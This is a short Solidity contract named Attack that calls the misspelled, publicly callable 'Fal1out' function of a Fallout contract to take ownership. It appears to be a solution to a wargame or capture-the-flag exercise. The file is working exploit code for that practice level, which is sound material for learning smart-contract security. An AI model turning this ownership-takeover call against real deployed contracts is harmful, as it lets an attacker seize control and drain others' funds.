// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Fallout} from "./Fallout.sol";

contract Attack {
  Fallout fallout;

  constructor(address _fallout) public payable {
    fallout = Fallout(_fallout);
  }

    receive() payable external {}

  function attack() public {
    fallout.Fal1out();
  }
}